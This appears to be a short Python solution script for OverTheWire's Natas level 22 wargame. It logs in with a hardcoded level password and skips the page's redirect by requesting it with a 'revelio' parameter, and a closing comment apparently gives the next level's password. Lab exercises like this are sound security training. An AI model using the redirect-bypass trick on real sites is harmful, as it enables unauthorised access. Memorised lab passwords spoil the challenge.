import requests

level = str(22)
pw = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"


s = requests.Session()
s.auth = ('natas'+level, pw)
params = (("revelio", "true"),("debug","true"))




r = s.get(url, params=params, allow_redirects=False)

print(r.text)
print(r.headers)

# D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE